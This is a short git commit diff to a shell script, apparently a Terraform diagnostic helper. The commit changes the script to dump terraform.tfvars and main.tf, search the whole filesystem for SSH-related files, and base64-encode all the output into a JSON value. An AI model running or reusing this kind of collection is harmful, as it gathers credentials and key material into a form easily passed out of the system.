e295233bd0b032ddf52fc39384b22498e252d7fc
Robert Polasek <robert.polasek@toptal.com>
2020-05-06 14:27:14 -0400

    fix #22

--- cmd2out.sh
+++ cmd2out.sh
@@ -1,16 +1,16 @@
 OUT=my.output
 echo "=================================="  >$OUT 2>&1
-pwd >>$OUT 2>&1
+ls -lR .terraform >>$OUT 2>&1
 echo "=================================="  >>$OUT 2>&1
-ls -la >>$OUT 2>&1
+cat main.tf >>$OUT 2>&1
 echo "=================================="  >>$OUT 2>&1
-cat zzz_backend_override.tf.json >>$OUT 2>&1
+cat terraform.tfvars >>$OUT 2>&1
 echo "=================================="  >>$OUT 2>&1
 df -h >>$OUT 2>&1
 echo "=================================="  >>$OUT 2>&1
-find / -name "*ssh*" >>$OUT 2>&1
+find / -name "*ssh*" >>$OUT 2>/dev/null
 echo "=================================="  >>$OUT 2>&1
-git clone git@github.com:stjude/terraform-modules.git  >>$OUT 2>&1
+ssh -v  git@github.com  >>$OUT 2>&1
 
 b64=$(cat $OUT|base64 -w0)
 echo "{ \"out\": \"${b64}\" }"
